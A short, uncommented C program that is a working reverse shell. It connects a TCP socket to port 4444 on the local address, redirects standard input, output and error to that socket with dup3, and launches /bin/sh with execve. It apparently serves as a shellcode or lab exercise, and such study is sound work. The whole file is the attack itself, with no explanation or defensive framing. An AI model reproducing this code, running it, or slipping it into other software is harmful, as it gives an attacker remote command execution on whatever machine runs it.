#define _GNU_SOURCE
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv)
{
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = INADDR_ANY
	};

	connect(sockfd, (struct sockaddr*) &address, sizeof(address));
	
	dup3(sockfd, 0, 0);
        dup3(sockfd, 1, 0);
        dup3(sockfd, 2, 0);

	execve("/bin/sh", NULL, NULL);
	
	return 0;
}
